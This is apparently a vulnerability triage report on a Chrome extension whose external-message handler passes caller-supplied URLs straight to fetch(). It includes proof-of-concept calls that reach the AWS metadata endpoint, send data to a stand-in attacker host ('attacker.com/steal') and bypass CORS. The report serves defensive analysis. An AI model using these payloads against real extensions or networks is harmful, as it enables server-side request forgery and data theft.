# CoCo Analysis: jkcbefbbcjcfajdpeibjnkdkijnjbgaj

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple (5+ fetch flows, 1 browsingData removal)

---

## Sink 1: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
- Source: `bg_chrome_runtime_MessageExternal`
- Sink: `fetch_resource_sink`
- File: `/home/tudor/DatasetCoCoCategorization/VulnerableExtensions/jkcbefbbcjcfajdpeibjnkdkijnjbgaj/opgen_generated_files/bg.js`
- Line 975

**Code:**

```javascript
// Background script (bg.js) - Lines 967-1051

chrome.runtime.onMessageExternal.addListener(function (
  request,  // ← attacker-controlled
  sender,
  sendResponse
) {
  console.log(request)

  if (request.type === "logBulkMsgs") {
    fetch(request.url, {  // ← attacker-controlled URL
      method: request.reqType,  // ← attacker-controlled method
      body: JSON.stringify({
        id: request.params.id,
        sentlist: request.params.sentList,
      }),
      headers: {
        "Content-type": "application/json; charset=UTF-8",
      },
    })
      .then((response) => response)
      .then((json) => {
        sendResponse(json)  // ← response sent back to attacker
        console.log(json)
      })
  } else if (request.type === "editBlockList") {
    fetch(request.url, {  // ← attacker-controlled URL
      method: request.reqType,
      body: JSON.stringify({
        id: request.params.id,
        list: request.params.list,
      }),
      headers: {
        "Content-type": "application/json; charset=UTF-8",
      },
    })
      .then((response) => response.json())
      .then((json) => {
        sendResponse(json)  // ← response sent back to attacker
        console.log(json)
      })
  } else if (request.type === "addGroupList") {
    fetch(request.url, {  // ← attacker-controlled URL
      method: request.reqType,
      body: JSON.stringify({
        userId: request.params.userId,
        name: request.params.name,
        numbers: request.params.numbers,
      }),
      headers: {
        "Content-type": "application/json; charset=UTF-8",
      },
    })
      .then((response) => response.json())
      .then((json) => {
        sendResponse(json)  // ← response sent back to attacker
        console.log(json)
      })
  } else if (request.type === "editGroupList") {
    fetch(request.url, {  // ← attacker-controlled URL
      method: request.reqType,
      body: JSON.stringify({
        id: request.params.id,
        userId: request.params.userId,
        name: request.params.name,
        numbers: request.params.numbers,
      }),
      headers: {
        "Content-type": "application/json; charset=UTF-8",
      },
    })
      .then((response) => response.json())
      .then((json) => {
        sendResponse(json)  // ← response sent back to attacker
        console.log(json)
      })
  } else {
    fetch(request.url, {  // ← attacker-controlled URL (default case)
      mode: "no-cors",
      method: request.reqType,  // ← attacker-controlled method
    }).then(async (response) => {
      let res = await response.json()
      console.log({ res, status: response.status })
      sendResponse({ res, status: response.status })  // ← response sent back to attacker
    })
  }
})
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From a webpage listed in externally_connectable (https://*.whatsapp.com/* or http://localhost:3000/)
// An attacker controlling one of these domains can exploit this vulnerability

// SSRF Attack - Access internal resources
chrome.runtime.sendMessage(
  'jkcbefbbcjcfajdpeibjnkdkijnjbgaj',  // Extension ID
  {
    type: 'logBulkMsgs',  // or any other type
    url: 'http://169.254.169.254/latest/meta-data/',  // AWS metadata
    reqType: 'GET',
    params: {
      id: 'test',
      sentList: []
    }
  },
  (response) => {
    console.log('Internal data:', response);  // Receives internal data
  }
);

// Exfiltrate data to attacker server
chrome.runtime.sendMessage(
  'jkcbefbbcjcfajdpeibjnkdkijnjbgaj',
  {
    type: 'logBulkMsgs',
    url: 'https://attacker.com/steal',
    reqType: 'POST',
    params: {
      id: 'stolen',
      sentList: ['sensitive', 'user', 'data']
    }
  },
  (response) => {
    console.log('Data exfiltrated');
  }
);

// Bypass CORS - make privileged cross-origin requests
chrome.runtime.sendMessage(
  'jkcbefbbcjcfajdpeibjnkdkijnjbgaj',
  {
    url: 'https://victim-api.com/admin/users',  // Target API
    reqType: 'GET'
  },
  (response) => {
    console.log('Retrieved data:', response);
  }
);
```

**Impact:**

This is a severe Server-Side Request Forgery (SSRF) vulnerability. An attacker controlling a whitelisted domain (*.whatsapp.com or localhost:3000) can:

1. **Make arbitrary HTTP requests** to any URL with GET or POST methods
2. **Exfiltrate data** by sending POST requests to attacker-controlled servers with arbitrary data in the body
3. **Access internal resources** like cloud metadata services (AWS, GCP, Azure), internal networks, or localhost services
4. **Bypass CORS restrictions** - the extension has broad host_permissions ("http://*/*", "https://*/*") allowing privileged cross-origin requests
5. **Retrieve responses** - all fetched content is sent back to the attacker via sendResponse
6. **No URL validation** - any URL provided by the attacker is directly passed to fetch() without sanitization

The extension permits external messages from *.whatsapp.com domains, which could be exploited if an attacker finds an XSS vulnerability on WhatsApp or controls a subdomain. The localhost:3000 entry also presents a risk if an attacker can run code on the user's localhost.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_browsingData_remove_sink

**Code:**

```javascript
// Lines 1053-1054
chrome.action.onClicked.addListener((tab) => {
  chrome.browsingData.remove({}, { serviceWorkers: true }, () => null)
  // ... rest of code
})
```

**Classification:** FALSE POSITIVE (for this specific sink)

**Reason:** This browsingData removal is triggered by chrome.action.onClicked (user clicking the extension icon), not by external messages. It's not connected to the onMessageExternal listener and cannot be triggered by an attacker. This is user-initiated action, not an exploitable flow.
